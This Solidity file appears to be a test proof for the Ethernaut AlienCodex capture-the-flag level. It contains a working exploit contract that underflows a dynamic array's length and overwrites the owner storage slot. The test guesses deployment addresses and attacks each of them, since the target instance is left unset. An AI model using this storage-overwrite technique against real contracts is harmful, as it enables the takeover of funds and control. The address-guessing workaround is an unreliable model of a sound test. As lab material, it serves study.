pragma solidity ^0.5.16;

contract Ownable {
    address public owner;
    constructor() public { owner = msg.sender; }
}

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;
    modifier contacted() { assert(contact); _; }
    function makeContact() public { contact = true; }
    function retract() public contacted { codex.length--; }
    function revise(uint256 index, bytes32 content) public contacted { codex[index] = content; }
}

interface AlienVm {
    function startBroadcast(uint256 privateKey) external;
    function stopBroadcast() external;
    function addr(uint256 privateKey) external returns (address);
}

contract AlienScript {
    AlienVm internal constant vm = AlienVm(address(uint160(uint256(keccak256("hevm cheat code")))));
    uint256 internal constant PLAYER_PRIVATE_KEY = 1;
    address internal constant PLAYER_ADDRESS = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;
}

contract CodexProbe {
    function createAddr(address deployer, uint256 nonce) public pure returns (address) {
        if (nonce == 0) {
            return address(uint160(uint256(keccak256(abi.encodePacked(
                uint8(0xd6), uint8(0x94), deployer, uint8(0x80)
            )))));
        }
        return address(uint160(uint256(keccak256(abi.encodePacked(
            uint8(0xd6), uint8(0x94), deployer, uint8(nonce)
        )))));
    }

    function attack(address target, address player) public {
        uint256 size;
        assembly { size := extcodesize(target) }
        if (target == address(0) || size == 0) return;

        (bool ok,) = target.call(abi.encodeWithSignature("makeContact()"));
        if (!ok) return;
        (ok,) = target.call(abi.encodeWithSignature("retract()"));
        if (!ok) return;
        target.call(abi.encodeWithSignature("retract()"));

        uint256 index1 = uint256(-uint256(keccak256(abi.encode(uint256(1)))));
        bytes32 payload = bytes32(uint256(uint160(player)) | (uint256(1) << 160));
        target.call(abi.encodeWithSignature("revise(uint256,bytes32)", index1, payload));
    }
}

contract PlayerDeployProof is AlienScript {
    AlienCodex public alienCodexInstance; // intentionally unset

    function testPlayerBroadcastDeploy() external {
        // Simulate setUp that deploys under broadcast as PLAYER
        vm.startBroadcast(PLAYER_PRIVATE_KEY);
        AlienCodex target = new AlienCodex();
        vm.stopBroadcast();

        // Exploit with unwired instance — must find PLAYER's CREATE
        CodexProbe probe = new CodexProbe();
        probe.attack(address(alienCodexInstance), PLAYER_ADDRESS);
        for (uint256 n = 0; n < 16; n++) {
            probe.attack(probe.createAddr(PLAYER_ADDRESS, n), PLAYER_ADDRESS);
        }

        require(target.owner() == PLAYER_ADDRESS, "player-deploy shotgun missed");
    }
}
